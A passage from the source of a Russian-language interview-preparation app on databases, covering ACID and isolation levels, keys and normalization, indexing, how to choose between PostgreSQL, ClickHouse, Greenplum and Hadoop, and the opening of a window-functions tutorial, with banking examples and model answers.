<li><b>Atomicity (атомарность)</b> — всё или ничего. Упало посередине — откатывается целиком. Не бывает «деньги списали, долг не уменьшили».</li>
<li><b>Consistency (согласованность)</b> — после транзакции все правила БД соблюдены: ограничения, внешние ключи, проверки. Баланс не станет отрицательным, если это запрещено.</li>
<li><b>Isolation (изолированность)</b> — параллельные транзакции не видят промежуточных состояний друг друга. Степень определяется уровнем изоляции.</li>
<li><b>Durability (долговечность)</b> — после подтверждения данные переживут отключение питания. Обеспечивается журналом транзакций (WAL): сначала пишем в журнал на диск, потом меняем данные.</li>
</ul>
<div class="co mem"><span class="co-i">🧠</span><span><b>Почему сначала журнал, а потом данные.</b> Запись в журнал — последовательная, она быстрая. Изменение данных в разных местах файла — медленное и не мгновенное. Если сервер упадёт посередине, при старте база прочитает журнал и доделает или откатит незавершённое. Отсюда и название: Write-Ahead Log, «сначала пишем в лог».</span></div>
<h4>Аномалии параллельного доступа</h4>
`+D.anomaly+`
<ul>
<li><b>Грязное чтение (dirty read).</b> Транзакция A изменила данные, но ещё не подтвердила. Транзакция B прочитала это изменение. A откатилась — B работает с данными, которых никогда не существовало.</li>
<li><b>Неповторяющееся чтение (non-repeatable read).</b> A прочитала строку, потом B изменила и подтвердила её. A читает ту же строку второй раз — значение другое. Внутри одной транзакции данные «поплыли».</li>
<li><b>Фантомное чтение (phantom read).</b> A выполнила запрос «все займы с просрочкой», получила 10 строк. B добавила новый просроченный займ. A повторяет тот же запрос — уже 11 строк. Появилась строка-«фантом».</li>
<li><b>Потерянное обновление (lost update).</b> A и B одновременно прочитали баланс 10 000. A вычла 3 000 и записала 7 000. B вычла 2 000 и записала 8 000, затерев изменение A. Три тысячи исчезли.</li>
</ul>
`+D.isolation+`
<div class="co fin"><span class="co-i">🏦</span><span><b>Как выбирают в банке.</b> По умолчанию Read Committed — он снимает грязное чтение и почти не стоит производительности. Для операций, где считается баланс или проверяется лимит, поднимают до Repeatable Read или Serializable, либо используют явную блокировку строки (<code>SELECT ... FOR UPDATE</code>). Держать Serializable на всей базе — верный способ получить взаимные блокировки и просевшую производительность.</span></div>
<h4>BASE — противоположный подход</h4>
<p>В распределённых NoSQL-системах жёсткий ACID недостижим, там действует BASE: <b>Basically Available</b> (система в целом доступна), <b>Soft state</b> (состояние может меняться само по мере синхронизации), <b>Eventually consistent</b> (данные сойдутся, но не мгновенно).</p>`,
prac:"Разбери на бумаге сценарий потерянного обновления для своей системы: два оператора одновременно фиксируют платёж по одному делу. Что произойдёт при Read Committed? Как это предотвратить — блокировкой, версией записи (оптимистичная блокировка) или уникальным ограничением? Это ровно тот класс багов, которые находят через месяц по расхождению в сверке.",
questions:[
{q:"Что такое ACID? Расшифруйте каждую букву.",
short:"Atomicity — транзакция выполняется целиком или откатывается. Consistency — после неё все правила БД соблюдены. Isolation — параллельные транзакции не мешают друг другу. Durability — подтверждённые данные переживут падение сервера.",
long:`Лучше объяснять на одном сквозном примере — погашении долга.<br><br><b>Atomicity.</b> Списываем 5000 со счёта и на 5000 уменьшаем долг. Если второй шаг упал, первый откатывается. Иначе деньги исчезли бы бесследно.<br><br><b>Consistency.</b> После транзакции соблюдены все ограничения: баланс не отрицательный, внешние ключи целы, сумма платежей сходится с историей. Это про правила предметной области, зашитые в схему.<br><br><b>Isolation.</b> Пока идёт наша транзакция, другая не должна видеть половинчатое состояние. Степень изоляции регулируется — полная изоляция стоит производительности.<br><br><b>Durability.</b> После COMMIT можно выдернуть кабель — данные не потеряются. Реализуется журналом WAL: изменение сначала записывается в журнал на диск последовательно, и только потом применяется к данным.<br><br><b>Хорошее завершение:</b> ACID — причина, по которой финансовые системы строятся на реляционных базах. В NoSQL действует BASE, где согласованность достигается со временем, и для баланса счёта это неприемлемо.`},
{q:"Какие уровни изоляции транзакций вы знаете?",
short:"Четыре: Read Uncommitted допускает грязное чтение, Read Committed убирает его, Repeatable Read защищает от неповторяющегося чтения, Serializable исключает все аномалии. Чем выше уровень, тем меньше параллелизма.",
long:`<b>Простая логика:</b> каждый уровень закрывает одну аномалию, платя за это скоростью.<br><br><b>Read Uncommitted</b> — видны неподтверждённые чужие изменения. На практике почти не используется, в PostgreSQL вообще работает как Read Committed.<br><br><b>Read Committed</b> — видим только подтверждённое. Уровень по умолчанию в PostgreSQL и Oracle. Внутри одной транзакции два одинаковых запроса могут дать разный результат.<br><br><b>Repeatable Read</b> — в течение транзакции повторный запрос вернёт те же строки. По умолчанию в MySQL InnoDB. От фантомов защищает не везде.<br><br><b>Serializable</b> — результат такой, будто транзакции выполнялись строго по очереди. Максимальная надёжность, минимальный параллелизм, вероятны конфликты сериализации, которые приложение должно уметь повторять.<br><br><b>Практика:</b> держат Read Committed по умолчанию, а для критичных мест используют явные блокировки <code>SELECT ... FOR UPDATE</code> или оптимистичную блокировку по версии записи. Это точечно и дешевле, чем поднимать уровень для всей базы.`},
{q:"Что такое потерянное обновление и как с ним бороться?",
short:"Две транзакции прочитали одно значение, обе посчитали от него и записали — второе затёрло первое. Лечится пессимистичной блокировкой SELECT FOR UPDATE, оптимистичной блокировкой по номеру версии или атомарным обновлением на стороне БД.",
long:`<b>Сценарий:</b> два оператора одновременно фиксируют платежи по одному делу. Оба прочитали остаток 10 000. Первый вычел 3 000 и записал 7 000. Второй вычел 2 000 от <b>своего прочитанного</b> значения и записал 8 000. Платёж первого потерян.<br><br><b>Три способа решения:</b><br><br>1. <b>Пессимистичная блокировка</b> — <code>SELECT ... FOR UPDATE</code>. Первая транзакция блокирует строку, вторая ждёт. Надёжно, но при высокой конкуренции создаёт очередь.<br><br>2. <b>Оптимистичная блокировка</b> — в таблице есть колонка <code>version</code>. Обновление идёт с условием <code>WHERE id = 12 AND version = 5</code> и увеличивает версию. Вторая транзакция не найдёт строку с версией 5 и получит ноль обновлённых строк — значит, кто-то опередил, надо перечитать и повторить. Лучше масштабируется.<br><br>3. <b>Атомарное обновление</b> — не читать и записывать, а сразу <code>UPDATE loans SET balance = balance - 3000 WHERE id = 12</code>. База сама применяет изменение к актуальному значению. Работает, когда логика простая.<br><br><b>Что фиксирует аналитик:</b> какое поведение показать пользователю при конфликте. «Данные изменились, обновите страницу» — это требование, а не деталь реализации.`}
]},

{id:"db-2",title:"Ключи и нормализация",
theory:`<h4>Виды ключей</h4>
`+D.keys+`
<ul>
<li><b>Первичный ключ (PK)</b> — уникально идентифицирует строку. Не может быть NULL, не должен меняться. Одна таблица — один первичный ключ.</li>
<li><b>Внешний ключ (FK)</b> — ссылка на первичный ключ другой таблицы. Может повторяться и быть NULL. Обеспечивает ссылочную целостность: нельзя создать займ несуществующему клиенту.</li>
<li><b>Составной ключ</b> — первичный ключ из нескольких колонок. Уникальна их <b>комбинация</b>, а не каждая по отдельности.</li>
<li><b>Естественный ключ</b> — из предметной области: ИНН, номер договора. Понятен, но может измениться, и это боль.</li>
<li><b>Суррогатный ключ</b> — искусственный: автоинкремент или UUID. Ничего не значит, зато никогда не меняется. В проде почти всегда предпочитают его.</li>
<li><b>Уникальный ключ (Unique)</b> — не первичный, но значения не повторяются. Например, email клиента.</li>
</ul>
<div class="co mem"><span class="co-i">🧠</span><span><b>Первичный или внешний — как не путать.</b> PK отвечает на вопрос «кто это?» и живёт в своей таблице. FK отвечает «чей это?» и указывает на другую таблицу. В таблице займов <code>id</code> — первичный (какой это займ), <code>client_id</code> — внешний (чей займ).</span></div>
<div class="co warn"><span class="co-i">⚠️</span><span><b>Почему естественные ключи опасны.</b> Взяли ИНН как первичный ключ клиента. Через год выяснилось: у части клиентов ИНН нет, у некоторых он изменился, а один был введён с опечаткой и уже разошёлся по десяти таблицам через внешние ключи. Суррогатный ключ такой проблемы не создаёт: он неизменен по определению, а ИНН становится обычным уникальным полем, которое можно править.</span></div>
<h4>Нормализация на живом примере</h4>
`+D.norm+`
<p><b>1NF</b> — все значения атомарны. Не «телефоны: +7900..., +7911...» в одной ячейке, а отдельные строки или таблица.</p>
<p><b>2NF</b> — 1NF плюс: при составном ключе каждый неключевой атрибут зависит от <b>всего</b> ключа, а не от части. Если в таблице <code>(client_id, promise_date, amount, client_name)</code> имя клиента зависит только от client_id — это нарушение.</p>
<p><b>3NF</b> — 2NF плюс: нет транзитивных зависимостей. Если в таблице займов хранить <code>client_id</code> и <code>client_region</code>, то регион зависит от клиента, а не от займа — это нарушение 3NF.</p>
<h4>Когда денормализуют сознательно</h4>
<ul>
<li><b>Витрины и отчёты</b> — заранее посчитанные агрегаты, чтобы не собирать их на каждый запрос</li>
<li><b>Горячее чтение</b> — хранить текущий статус рядом с делом, а не вычислять из истории событий</li>
<li><b>Микросервисы</b> — сервис держит копию нужных ему полей чужого домена, чтобы не ходить за ними синхронно</li>
<li><b>Исторические снимки</b> — в чеке сохраняют цену на момент покупки, а не ссылку на прайс: цена в справочнике изменится, а чек должен остаться прежним</li>
</ul>
<div class="co tip"><span class="co-i">💡</span><span>Последний пункт — не денормализация, а важное отличие: есть данные-<b>справочники</b> (актуальное значение) и данные-<b>факты</b> (что было в момент события). Путаница между ними — источник багов вида «в старых отчётах поменялись суммы».</span></div>`,
prac:"Возьми любую таблицу своей системы и проверь на 3NF: есть ли поля, которые зависят не от первичного ключа, а от другого поля? Потом задай второй вопрос: если такие есть — это ошибка проектирования или сознательный снимок на момент события? Ответ на второй вопрос важнее первого.",
questions:[
{q:"Чем первичный ключ отличается от внешнего? Что такое составной ключ?",
short:"Первичный уникально идентифицирует строку в своей таблице, не бывает NULL и не меняется. Внешний ссылается на первичный ключ другой таблицы, может повторяться. Составной — первичный ключ из нескольких колонок, где уникальна их комбинация.",
long:`<b>Пример на трёх таблицах:</b><br>— <code>clients.id</code> — первичный ключ, идентифицирует клиента<br>— <code>loans.id</code> — первичный ключ займа<br>— <code>loans.client_id</code> — внешний ключ, указывает чей это займ. Повторяется, потому что у клиента может быть несколько займов<br><br><b>Составной ключ — на примере обещаний оплаты.</b> Таблица <code>(client_id, promise_date)</code> как первичный ключ означает: клиент может дать много обещаний и на одну дату может быть много обещаний от разных клиентов, но <b>один клиент не может дать два обещания на одну дату</b>. Уникальна пара.<br><br><b>Что даёт внешний ключ кроме документирования связи:</b> ссылочную целостность. База не даст создать займ несуществующему клиенту и не даст удалить клиента, у которого есть займы, — если только не настроено каскадное удаление.<br><br><b>Практический нюанс про каскады:</b> <code>ON DELETE CASCADE</code> удобен, но в финансовых системах опасен — удаление клиента может тихо снести всю его историю. Обычно предпочитают запрет удаления и мягкое удаление флагом.`},
{q:"Что такое нормализация и когда от неё отступают?",
short:"Приведение схемы к виду, где каждый факт хранится один раз. 1NF — атомарные значения, 2NF — нет зависимости от части составного ключа, 3NF — нет транзитивных зависимостей. Денормализуют сознательно ради скорости чтения в витринах и отчётах.",
long:`<b>Зачем вообще нормализовать</b> — три аномалии:<br>— <b>Обновления:</b> телефон клиента хранится в каждой строке займов, сменился — правь везде, пропустил одну — данные разошлись<br>— <b>Вставки:</b> нельзя завести клиента без займа, если они в одной таблице<br>— <b>Удаления:</b> удалил последний займ — потерял клиента<br><br><b>Когда денормализация оправдана:</b> тяжёлые аналитические запросы, витрины, кэширование агрегатов, копии данных в микросервисах.<br><br><b>Цена денормализации:</b> вы обязаны сами следить за согласованностью копий. Обычно через события: изменилось в источнике — прилетело событие — обновили копию. Если этого механизма нет, данные разъедутся, и вопрос только в том, когда это заметят.<br><br><b>Отдельно стоит проговорить снимки.</b> Хранить в чеке цену на момент покупки — это не денормализация и не ошибка. Справочник хранит актуальное значение, факт хранит историческое. Если этого не различать, старые отчёты начнут «переписываться» задним числом при каждом изменении прайса.`}
]},

{id:"db-3",title:"Индексы и оптимизация",
theory:`<p><b>Индекс на пальцах</b> — оглавление книги. Без него, чтобы найти главу, придётся пролистать всё (это Seq Scan). С ним — открыл оглавление и прыгнул на нужную страницу.</p>
`+D.index+`
<h4>Виды индексов</h4>
<table>
<tr><th>Тип</th><th>Для чего</th><th>Частота использования</th></tr>
<tr><td><b>B-tree</b></td><td>Равенство, диапазоны, сортировка, префиксный поиск</td><td>~95% всех индексов, тип по умолчанию</td></tr>
<tr><td><b>Hash</b></td><td>Только точное равенство</td><td>Редко — B-tree умеет то же и больше</td></tr>
<tr><td><b>GIN</b></td><td>Полнотекстовый поиск, JSONB, массивы</td><td>Когда ищем внутри составного значения</td></tr>
<tr><td><b>GiST / BRIN</b></td><td>Геоданные · огромные таблицы с естественным порядком</td><td>Специальные случаи</td></tr>
</table>
<div class="co mem"><span class="co-i">🧠</span><span><b>Если на собесе спросят «какой индекс используется чаще всего» — ответ B-tree.</b> Он универсален: работает и на равенство, и на диапазоны, и на сортировку, и на поиск по началу строки. Остальные типы — под конкретные задачи.</span></div>
<h4>Где индекс нужен</h4>
<ul>
<li>Поля в <code>WHERE</code>, особенно с высокой селективностью (мало повторов)</li>
<li>Поля в <code>JOIN ... ON</code> — почти всегда обязательно</li>
<li>Поля в <code>ORDER BY</code> — индекс избавляет от сортировки</li>
<li>Внешние ключи — иначе проверка целостности и каскады будут медленными</li>
<li>Поля с ограничением уникальности — индекс создаётся автоматически</li>
</ul>
<h4>Где индекс не нужен или вреден</h4>
<ul>
<li><b>Маленькие таблицы</b> — до нескольких тысяч строк база быстрее прочитает всё целиком</li>
<li><b>Низкая селективность</b> — индекс по полю «пол» или булеву флагу с равномерным распределением бесполезен: половина таблицы всё равно попадёт в выборку</li>
<li><b>Таблицы с очень интенсивной записью</b> — каждый INSERT обновляет все индексы. Десять индексов на таблице логов заметно замедлят вставку</li>
<li><b>Поля, которые почти не используются в фильтрах</b> — платим местом и скоростью записи ни за что</li>
</ul>
<div class="co warn"><span class="co-i">⚠️</span><span><b>Что убивает индекс, даже если он есть:</b><br>— <b>Функция над полем:</b> <code>WHERE date(created_at) = '2025-01-01'</code> → Seq Scan. Правильно: <code>WHERE created_at >= '2025-01-01' AND created_at &lt; '2025-01-02'</code><br>— <b>Приведение типа:</b> сравнение строки с числом<br>— <b>LIKE с ведущим процентом:</b> <code>LIKE '%иванов'</code> — индекс не поможет, нужен полнотекстовый<br>— <b>OR по разным колонкам</b> — часто вынуждает полный проход</span></div>
<h4>Правило левого префикса</h4>
<p>Составной индекс <code>(region, status, created_at)</code> — как телефонный справочник, отсортированный сначала по фамилии, потом по имени, потом по отчеству.</p>
<ul>
<li>Поиск по <code>region</code> — работает</li>
<li><code>region + status</code> — работает</li>
<li><code>region + status + created_at</code> — работает</li>
<li>Только по <code>status</code> — <b>не работает</b>, это как искать всех «Сергеевичей» в справочнике по фамилиям</li>
</ul>
<h4>Порядок оптимизации запроса</h4>
<ol>
<li><code>EXPLAIN ANALYZE</code> — смотрим фактический план и время каждого шага</li>
<li>Ищем <code>Seq Scan</code> по большой таблице — обычно отсутствующий индекс</li>
<li>Проверяем, не убита ли индексируемость функцией над полем</li>
<li>Смотрим на N+1: приложение делает запрос в цикле вместо одного JOIN</li>
<li>Тяжёлая регулярная агрегация → материализованное представление</li>
<li>Всё ещё медленно → денормализация или отдельное хранилище под чтение</li>
</ol>`,
prac:"Возьми самый медленный отчётный запрос своей системы и запусти EXPLAIN ANALYZE. Найди самую дорогую строку плана. Если там Seq Scan по таблице на миллионы строк — проверь, есть ли индекс на поле из WHERE и не завёрнуто ли оно в функцию. В половине случаев проблема именно во втором.",
questions:[
{q:"Какой тип индекса используется чаще всего и почему?",
short:"B-tree — он тип по умолчанию и покрывает почти все задачи: равенство, диапазоны, сортировку, поиск по началу строки. Остальные типы применяются точечно: GIN для полнотекстового поиска и JSONB, Hash только для равенства.",
long:`<b>Почему B-tree универсален.</b> Данные в нём хранятся упорядоченно, поэтому один индекс обслуживает и <code>WHERE id = 5</code>, и <code>WHERE amount BETWEEN 100 AND 500</code>, и <code>ORDER BY created_at</code>, и <code>LIKE 'ива%'</code>. Плюс он сбалансирован: глубина дерева растёт логарифмически, поиск в таблице на миллиард строк — это несколько обращений к диску.<br><br><b>Почему Hash почти не используют:</b> он умеет только точное равенство, не поддерживает сортировку и диапазоны, а выигрыш по скорости минимален. B-tree покрывает те же случаи и больше.<br><br><b>GIN</b> нужен, когда значение составное и искать надо <b>внутри</b> него: слова в тексте, ключи в JSONB, элементы массива.<br><br><b>BRIN</b> — узкий, но иногда спасительный случай: гигантская таблица, где данные физически лежат в порядке возрастания (логи по времени). Индекс хранит только диапазоны по блокам, занимает копейки места.<br><br><b>Ответ на собесе:</b> «по умолчанию B-tree, специальные типы — только когда есть конкретная причина». Это точно и не выглядит как заученный список.`},
{q:"Когда индекс не нужен или даже вреден?",
short:"На маленьких таблицах, на полях с низкой селективностью вроде булевых флагов, и на таблицах с интенсивной записью — каждый индекс замедляет INSERT и UPDATE, потому что его тоже надо обновлять.",
long:`<b>Три случая, когда индекс — минус:</b><br><br>1. <b>Маленькая таблица.</b> Справочник на 200 строк база прочитает целиком быстрее, чем пойдёт через индекс. Планировщик обычно и сам игнорирует такой индекс.<br><br>2. <b>Низкая селективность.</b> Индекс по полю «активен ли клиент», где 90% записей активны, бесполезен: выборка всё равно затрагивает почти всю таблицу, и последовательное чтение окажется дешевле. Исключение — частичный индекс на редкое значение: <code>CREATE INDEX ... WHERE status = 'blocked'</code>.<br><br>3. <b>Интенсивная запись.</b> Каждый INSERT обновляет все индексы таблицы. На таблице событий с десятью индексами вставка станет заметно дороже. Здесь всегда компромисс между скоростью записи и скоростью чтения.<br><br><b>Отдельная категория — неиспользуемые индексы.</b> Создали «на всякий случай», запросов по этому полю нет. Они занимают место, замедляют запись и не дают ничего. В PostgreSQL их видно через <code>pg_stat_user_indexes</code> — периодическая ревизия обязательна.<br><br><b>Практика:</b> индексы добавляют не заранее, а по факту — на основании медленных запросов из мониторинга.`}
]},

{id:"db-4",title:"Какую БД выбирать: разбор по каждой",
theory:D.oltp+`
<h4>PostgreSQL — рабочая лошадь OLTP</h4>
<p><b>Когда брать:</b> любые данные, где важна целостность — клиенты, договоры, займы, платежи, статусные модели. Полноценный ACID, богатый SQL, оконные функции, JSONB для полуструктурированных данных, расширения (pgvector для эмбеддингов, PostGIS для геоданных).</p>
<p><b>Когда не брать:</b> аналитика по миллиардам строк (будет медленно), запись со скоростью сотни тысяч событий в секунду, полнотекстовый поиск промышленного масштаба.</p>
<div class="co fin"><span class="co-i">🏦</span><span><b>Pangolin</b> — это СУБД Сбера на базе PostgreSQL: форк с доработками под требования банка — импортозамещение, усиленная безопасность, отказоустойчивость, поддержка масштаба. Для аналитика практически важно: это <b>тот же PostgreSQL</b> по модели данных и синтаксису SQL, поэтому все знания по Postgres переносятся напрямую. Отличия лежат в эксплуатации и корпоративных доработках, а не в том, как вы проектируете таблицы. На собеседовании честно так и говорить: «работаем на Pangolin, это PostgreSQL-совместимая СУБД, модель данных и SQL те же». Детали конкретной сборки лучше уточнить у своей команды — они могут отличаться от версии к версии.</span></div>
<h4>ClickHouse — колоночная аналитика</h4>
<p><b>Когда брать:</b> аналитика и отчётность на больших объёмах, где запросы читают миллионы строк, но мало колонок. Логи, метрики, события, поведенческая аналитика. Скорость агрегации на порядки выше реляционных СУБД.</p>
<p><b>Когда не брать:</b> точечные обновления и удаления (они дорогие и асинхронные), транзакции, сложные JOIN между большими таблицами, любые операции с деньгами.</p>
<p><b>Почему быстрый:</b> хранит данные по колонкам. Запрос «средняя сумма долга» читает с диска одну колонку, а не поднимает строки целиком со всеми ФИО и адресами. Плюс сильное сжатие — однотипные значения в колонке жмутся отлично.</p>
<h4>Greenplum — MPP-хранилище</h4>
<p><b>Что это:</b> массивно-параллельная СУБД на базе PostgreSQL. Данные распределены по сегментам, запрос выполняется на всех узлах параллельно, результаты собираются.</p>
<p><b>Когда брать:</b> корпоративное хранилище данных (DWH), где нужен полноценный SQL с сложными JOIN по большим объёмам, регламентные расчёты и витрины. Сильная сторона — именно сложная аналитика с соединениями, где ClickHouse слабее.</p>
<p><b>Ключевой момент проектирования — ключ распределения.</b> Неудачно выбрали — данные лягут неравномерно, один сегмент станет узким местом, а JOIN потребует перекачки данных между узлами по сети.</p>
<h4>Hadoop — экосистема для сырых данных</h4>
<p><b>Что это:</b> не база, а экосистема: HDFS (распределённая файловая система), плюс движки обработки — Spark, Hive. Данные лежат файлами, схема применяется при чтении.</p>
<p><b>Когда брать:</b> Data Lake — хранить всё подряд, включая полуструктурированные и сырые данные, дёшево и в больших объёмах. Тяжёлая пакетная обработка, подготовка данных для ML.</p>
<p><b>Когда не брать:</b> любые интерактивные запросы с ожиданием ответа за секунды, транзакции, точечное чтение по ключу.</p>
<h4>Связки, которые встречаются в проде</h4>
<table>
<tr><th>Задача</th><th>Связка</th><th>Почему так</th></tr>
<tr><td>Операционная система взыскания</td><td>PostgreSQL/Pangolin + Redis</td><td>ACID для дел и платежей, Redis для кэша и счётчиков контактов по 230-ФЗ</td></tr>
<tr><td>События между сервисами</td><td>Kafka + PostgreSQL (Outbox)</td><td>Атомарная публикация событий без потерь</td></tr>
<tr><td>Оперативная аналитика</td><td>Kafka → ClickHouse</td><td>Поток событий сразу в колоночное хранилище, дашборды в реальном времени</td></tr>
<tr><td>Корпоративная отчётность</td><td>Источники → Hadoop/Greenplum → витрины</td><td>Сырые данные в озере, обработанные в DWH, витрины под потребителей</td></tr>
<tr><td>Поиск по обращениям</td><td>PostgreSQL + Elasticsearch</td><td>Источник правды в реляционной, поисковый индекс отдельно</td></tr>
</table>
<div class="co mem"><span class="co-i">🧠</span><span><b>Главная мысль для собеса:</b> в зрелой системе не одна база, а несколько, каждая под свой профиль нагрузки. Это называется <b>polyglot persistence</b>. И ключевой вопрос при выборе — не «какая база лучше», а «какой у нас профиль: много мелких транзакций или редкие тяжёлые агрегации, что важнее — консистентность или скорость записи».</span></div>
<h4>Реляционная или нереляционная — как решать</h4>
<p><b>Берите реляционную, если:</b> данные связаны и связи важны; нужны транзакции; схема стабильна; критична целостность; предстоят разнообразные запросы, которые нельзя предсказать заранее.</p>
<p><b>Берите нереляционную, если:</b> структура данных плавает или сильно разная; нужна горизонтальная масштабируемость под огромный поток; шаблоны запросов известны заранее и их немного; допустима согласованность со временем.</p>
<div class="co warn"><span class="co-i">⚠️</span><span><b>Частая ошибка:</b> выбирать NoSQL «потому что данных много». Объём сам по себе не аргумент — PostgreSQL спокойно живёт на терабайтах. Настоящие причины перехода: неподходящая модель данных, потребность в горизонтальном масштабировании записи или профиль нагрузки, под который реляционная база не заточена.</span></div>`,
prac:"Нарисуй карту хранилищ своего проекта: какие данные в какой БД лежат и почему. Для каждой пары ответь: что случится, если перенести эти данные в соседнюю? Обычно на одной-двух парах выясняется, что выбор был исторический, а не осознанный — и это отличный материал для разговора на собеседовании.",
questions:[
{q:"Чем OLTP отличается от OLAP?",
short:"OLTP обрабатывает много мелких транзакций в реальном времени и хранит данные построчно — это PostgreSQL и подобные. OLAP выполняет редкие тяжёлые агрегации по миллионам строк и хранит данные по колонкам — ClickHouse, Greenplum.",
long:`<b>Различие идёт от профиля запросов.</b><br><br>OLTP: «покажи баланс клиента 777», «спиши 5000». Тысячи таких операций в секунду, каждая трогает единицы строк, нужен ACID.<br><br>OLAP: «средняя просрочка по регионам за два года с разбивкой по продуктам». Один запрос, читает миллионы строк, но всего несколько колонок.<br><br><b>Почему колоночное хранение выигрывает в аналитике.</b> В строковой базе данные строки лежат рядом — чтобы посчитать среднее по одной колонке, диск всё равно поднимет строки целиком, включая ФИО и адреса. В колоночной каждая колонка лежит отдельно: читаем только нужную. Плюс однотипные значения в колонке отлично сжимаются.<br><br><b>Почему нельзя одной базой.</b> Тяжёлый аналитический запрос на боевой OLTP-базе съест ресурсы и затормозит операционные транзакции. Поэтому данные реплицируют или переливают в отдельное аналитическое хранилище.<br><br><b>Как связаны на практике:</b> OLTP → CDC или Kafka → OLAP. Операционная база остаётся источником правды, аналитика живёт отдельно и может отставать на минуты.`},
{q:"Как выбрать между реляционной и нереляционной БД?",
short:"Смотрю на три вещи: насколько связаны данные, нужны ли транзакции и стабильна ли схема. Связанные данные с транзакциями и стабильной схемой — реляционная. Плавающая структура, огромный поток записи и заранее известные запросы — NoSQL.",
long:`<b>Разбор по типам NoSQL, чтобы ответ не был абстрактным:</b><br><br><b>Key-value (Redis)</b> — быстрый доступ по ключу, TTL из коробки. Кэш, сессии, счётчики, распределённые блокировки.<br><br><b>Документная (MongoDB)</b> — гибкая структура, документ читается целиком. Профили, логи, конфигурации.<br><br><b>Колоночная (Cassandra)</b> — огромный поток записи, запросы известны заранее и под них проектируется схема. Телеметрия, история событий.<br><br><b>Поисковая (Elasticsearch)</b> — полнотекстовый поиск и анализ логов.<br><br><b>Графовая (Neo4j)</b> — когда важны сами связи: поиск схем в AML, связанные лица.<br><br><b>Главная ошибка при выборе:</b> брать NoSQL из-за объёма данных. Объём — не аргумент, реляционные базы живут на терабайтах. Настоящие причины: модель данных не ложится на таблицы, нужно горизонтально масштабировать запись, или профиль нагрузки принципиально другой.<br><br><b>Практический ответ:</b> в реальной системе используются обе. Деньги в реляционной, кэш в Redis, логи в Elasticsearch, аналитика в колоночной.`}

const BWIN = {id:"bwin",icon:"🪟",title:"Оконные функции с нуля",tag:"мини-курс",color:"green",
desc:"Пошагово от «вообще не понимаю» до уверенного использования. Именно они отличают мидла от сеньора в SQL.",
topics:[

{id:"win-1",title:"Шаг 1. Зачем они вообще нужны",
theory:`<p><b>Проблема, которую они решают.</b> У вас есть платежи клиентов. Задача: показать <b>каждый платёж</b> и рядом — сколько клиент выплатил всего.</p>
<p>Через <code>GROUP BY</code> не получится: он схлопывает строки. Вы получите одну строку на клиента и потеряете сами платежи. А нужны и платежи, и итог одновременно.</p>
`+D.window+`
<div class="co mem"><span class="co-i">🧠</span><span><b>Формулировка на всю жизнь:</b> <b>GROUP BY схлопывает строки. OVER() оставляет строки на месте и просто дописывает колонку с расчётом.</b> Если поняли только это — вы уже поняли главное.</span></div>
<h4>Три задачи, которые без окон делаются мучительно</h4>
<ol>
<li><b>Нарастающий итог.</b> Сколько клиент выплатил к каждому моменту.</li>
<li><b>Топ-N внутри группы.</b> Три самых крупных должника в каждом регионе.</li>
<li><b>Сравнение с соседней строкой.</b> Как изменился статус дела относительно предыдущего события.</li>
</ol>
<p>Без окон каждая из них решается через подзапрос, коррелированный подзапрос или соединение таблицы с самой собой — длинно и медленно.</p>
<div class="co ex"><span class="co-i">📊</span><span><b>Простейший пример для начала.</b> Показать каждый займ и рядом — общую сумму по всем займам:<br><br>
<code>SELECT id, amount, SUM(amount) OVER () AS total FROM loans;</code><br><br>
Пустые скобки <code>OVER ()</code> означают «окно — вся таблица». Каждая строка получит одинаковый итог рядом с собой. Просто, а через GROUP BY так не сделать.</span></div>`,
prac:"Возьми любую свою таблицу и напиши запрос: все строки плюс колонка с общей суммой по одному числовому полю через SUM(...) OVER (). Один запрос, пять минут. Это фундамент — дальше только добавляем в скобки.",
questions:[
{q:"Что такое оконные функции и чем отличаются от GROUP BY?",
short:"Оконная функция считает значение по группе строк, но не схлопывает их — все строки остаются, добавляется колонка с расчётом. GROUP BY превращает группу в одну строку и теряет детали.",
long:`<b>Разница на примере.</b> Три платежа клиента: 1000, 2000, 500.<br><br>С <code>GROUP BY client_id</code> получаем одну строку: клиент — 3500. Отдельные платежи потеряны.<br><br>С <code>SUM(amount) OVER (PARTITION BY client_id)</code> получаем три строки, у каждой рядом стоит 3500. И детали, и итог.<br><br><b>Почему это важно на практике.</b> Типичная задача отчётности — показать операцию и рядом её долю или накопительный итог. Без окон приходится делать подзапрос на каждую строку (медленно) или соединение таблицы с агрегированной версией себя (громоздко).<br><br><b>Технический нюанс, который стоит знать:</b> оконные функции вычисляются <b>после</b> WHERE, GROUP BY и HAVING, но <b>до</b> ORDER BY и LIMIT. Отсюда практическое следствие: нельзя отфильтровать по результату оконной функции в том же WHERE — нужен подзапрос или CTE. На собеседовании этот момент проверяют почти всегда.`}
]},

{id:"win-2",title:"Шаг 2. PARTITION BY — режем на группы",
theory:`<p>Пустое <code>OVER ()</code> считает по всей таблице. Чтобы считать внутри групп — добавляем <code>PARTITION BY</code>.</p>
<pre style="background:#0f1e2e;color:#8fe3d5;padding:13px 15px;border-radius:9px;font-size:12px;overflow-x:auto;line-height:1.7">SELECT client_id,
       amount,
       SUM(amount) OVER (PARTITION BY client_id) AS client_total
FROM payments;</pre>
<p>Читается так: «раздели строки на группы по client_id и внутри каждой группы посчитай сумму, но строки не схлопывай».</p>
<div class="co mem"><span class="co-i">🧠</span><span><b>PARTITION BY — это GROUP BY, который не удаляет строки.</b> Синтаксис похож, смысл похож, разница только в том, что строки остаются. Если запомнить эту связку, половина сложности исчезает.</span></div>
<h4>Что можно ставить перед OVER</h4>
<table>
<tr><th>Функция</th><th>Что делает</th><th>Пример задачи</th></tr>
<tr><td><code>SUM()</code></td><td>Сумма по окну</td><td>Всего выплачено клиентом</td></tr>
<tr><td><code>COUNT()</code></td><td>Количество</td><td>Сколько займов у клиента</td></tr>
<tr><td><code>AVG()</code></td><td>Среднее</td><td>Средний платёж по региону</td></tr>
<tr><td><code>MAX()</code> / <code>MIN()</code></td><td>Максимум / минимум</td><td>Самый крупный долг клиента</td></tr>
<tr><td><code>ROW_NUMBER()</code></td><td>Порядковый номер в группе</td><td>Пронумеровать платежи клиента</td></tr>
<tr><td><code>RANK()</code> / <code>DENSE_RANK()</code></td><td>Ранг с учётом равных значений</td><td>Место в рейтинге должников</td></tr>
<tr><td><code>LAG()</code> / <code>LEAD()</code></td><td>Значение из предыдущей / следующей строки</td><td>Предыдущий статус дела</td></tr>
</table>
<div class="co ex"><span class="co-i">📊</span><span><b>Полезный приём — доля от общего.</b><br><br>
<code>SELECT client_id, amount,<br>
&nbsp;&nbsp;ROUND(100.0 * amount / SUM(amount) OVER (PARTITION BY client_id), 1) AS pct<br>
FROM payments;</code><br><br>
